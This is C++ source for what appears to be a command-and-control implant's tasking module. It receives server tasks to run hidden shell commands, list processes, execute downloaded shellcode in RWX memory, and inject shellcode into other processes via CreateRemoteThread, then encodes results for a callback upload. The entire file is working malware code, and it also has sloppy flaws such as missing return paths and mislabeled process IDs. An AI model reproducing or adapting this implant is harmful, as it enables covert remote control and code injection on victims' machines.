#include "Tasking.h"
#include "Helper.h"
#include <TlHelp32.h>
#include <string>
#include <vector>

#define OPCODE_CMD 1
#define OPCODE_PS 2
#define OPCODE_LOAD 3
#define OPCODE_INJECT 4



std::string TaskingError(const char* input) {

	char err[10];

	std::string ret = "Error: ";
	ret += input;
	sprintf_s(err, "%d", GetLastError());
	ret += " - Error Code: ";
	ret += err ;

	return ret;

}

std::string ExecuteCmd(std::string command) {

	std::string ret;

	// Handle creation

	HANDLE ReadPipe = 0;
	HANDLE WritePipe = 0;
	PROCESS_INFORMATION piProcInfo;
	STARTUPINFOA StartInfo;
	SECURITY_ATTRIBUTES  pipeattrb;

	::ZeroMemory(&pipeattrb, sizeof(pipeattrb));
	::ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
	::ZeroMemory(&StartInfo, sizeof(STARTUPINFO));

	// Pipe stuff

	pipeattrb.nLength = sizeof(SECURITY_ATTRIBUTES);
	pipeattrb.bInheritHandle = TRUE;
	pipeattrb.lpSecurityDescriptor = NULL;

	if (!::CreatePipe(&ReadPipe, &WritePipe, &pipeattrb, 2048 * 4))
		return TaskingError("Error Creating Pipe");

	// Proc stuff

	StartInfo.cb = sizeof(STARTUPINFO);
	StartInfo.hStdError = WritePipe;
	StartInfo.hStdOutput = WritePipe;
	StartInfo.hStdInput = ReadPipe;
	StartInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	StartInfo.wShowWindow = SW_HIDE;

	std::string cmd = "c:\\windows\\system32\\cmd.exe /c " + command;

	if (!::CreateProcessA(NULL, (LPSTR)(cmd.c_str()), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &StartInfo, &piProcInfo))
		return TaskingError("Cannot Create Process");

	// cleanup 

	if (WaitForSingleObject(piProcInfo.hProcess, 30 * 1000) == WAIT_TIMEOUT) {
		
		::TerminateProcess(piProcInfo.hProcess, 0);
		::CloseHandle(piProcInfo.hProcess);
		::CloseHandle(piProcInfo.hThread);
		::CloseHandle(ReadPipe);
		::CloseHandle(WritePipe);
		
		return "CMD - TIMEOUT";
		
	}

	while (TRUE) {
		DWORD dwAvailable = 0;
		DWORD dwRead = 0;
		char buffer[1024];

		if (!::PeekNamedPipe(ReadPipe, NULL, sizeof(buffer), NULL, &dwAvailable, NULL))
			break;

		if (dwAvailable > 0) {
			if (!::ReadFile(ReadPipe, buffer, sizeof(buffer), &dwRead, NULL))
				break;

			ret.append(buffer, dwRead);

		}
		else
			break;
	}

	::CloseHandle(ReadPipe);
	::CloseHandle(WritePipe);

	return ret;

}

std::string ExecutePS() {

	// This will not be used in prod implant build

	std::wstring ps;

	HANDLE hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapshot == INVALID_HANDLE_VALUE)
		return "Unable to create snapshot";

	ps.append(L"Process, PID\n");
	
	PROCESSENTRY32 pe = { sizeof(pe) };
	if (::Process32FirstW(hSnapshot, &pe)) {
		do {

			ps.append(std::wstring(pe.szExeFile) + L", " + std::to_wstring(pe.th32ParentProcessID) + L"\n");
			
		} while (::Process32Next(hSnapshot, &pe));

	}
	::CloseHandle(hSnapshot);

	return std::string(ps.begin(), ps.end());
}

std::string Load(std::string sc) {

	std::vector<uint8_t> myVector(sc.begin(), sc.end());
	LPVOID address = ::VirtualAlloc(NULL, myVector.size(), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (address) {

		memcpy(address, &myVector[0], myVector.size());
		HANDLE hThread = ::CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)address, NULL, 0, 0);
		
		if (hThread) {

			CloseHandle(hThread);
			return std::string("succ suss");

		}

	}
	else return TaskingError("Unable to allocate memory");

}

std::string Inject(int target, std::string sc) {

	std::vector<uint8_t> myVector(sc.begin(), sc.end());

	HANDLE hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, 0, (DWORD)target);
	if (hProcess) {

		LPVOID address = ::VirtualAllocEx(hProcess, NULL, myVector.size(), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (address) {
			if (::WriteProcessMemory(hProcess, address, &myVector[0], myVector.size(), NULL)) {

				HANDLE hThread = ::CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)address, nullptr, 0, 0);
				if (!hThread) {

					::CloseHandle(hProcess);
					return TaskingError("Unable to create remote thread");
				}
				else {

					::CloseHandle(hProcess);
					::CloseHandle(hThread);
					return std::string("succ sess");

				}
			}
			else {

				::CloseHandle(hProcess);
				return TaskingError("Unable to allocate memory in remote process");

			}
		}
		else return TaskingError("Unable to obtain remote process handle");

	}
}

std::string ExecuteTasking(State state, std::string &inbound) {

	Response response;

	std::string responseString = "";
	Task task = DeserializeData(inbound);
	inbound = "";

	response.UUID = state.uuid; // test
	response.taskid = task.taskid; // test

	switch (atoi(task.task.c_str())) {

		case OPCODE_CMD:

			response.Payload = ExecuteCmd(task.data);
			break;

		case OPCODE_PS:

			response.Payload = ExecutePS();
			break;

		case OPCODE_LOAD:
			
			response.Payload = Load(cleaner(task.data));
			break;

		case OPCODE_INJECT:
						
			response.Payload = Inject(atoi(task.target.c_str()) , cleaner(task.data));
			break;

	}


	responseString = CALLBACK_UPLOADPARAM + std::string("=") + Encode(SerializeData(&response));

	return responseString;

}

